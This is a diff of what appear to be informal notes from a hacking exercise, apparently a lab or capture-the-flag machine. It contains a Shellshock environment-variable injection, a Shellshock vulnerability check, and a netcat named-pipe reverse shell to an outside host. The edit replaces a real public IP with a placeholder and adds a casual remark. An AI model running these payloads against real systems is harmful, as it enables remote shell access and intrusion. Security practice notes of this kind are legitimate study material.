@@ -179,7 +179,7 @@ env x='() { :;}; mknod /tmp/backpipe p ' bash -c 'echo hello'
 
 then
 
-/bin/sh 0</tmp/backpipe | nc 24.252.40.195 4447 1>/tmp/backpipe
+/bin/sh 0</tmp/backpipe | nc (public ip) 4447 1>/tmp/backpipe
 
 and on my machine:
 
@@ -213,7 +213,8 @@ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 vulnerable, maybe we can use shellshock?
 
 
-fuck if I know tbh. This one is very hard indeed. managed to get some backdoors but no root yet >:{
+fuck if I know tbh. Also I'm hungry af right now. This one is very hard indeed. 
+Managed to get some backdoors but no root yet >:{
 I'll come back to it
 
 
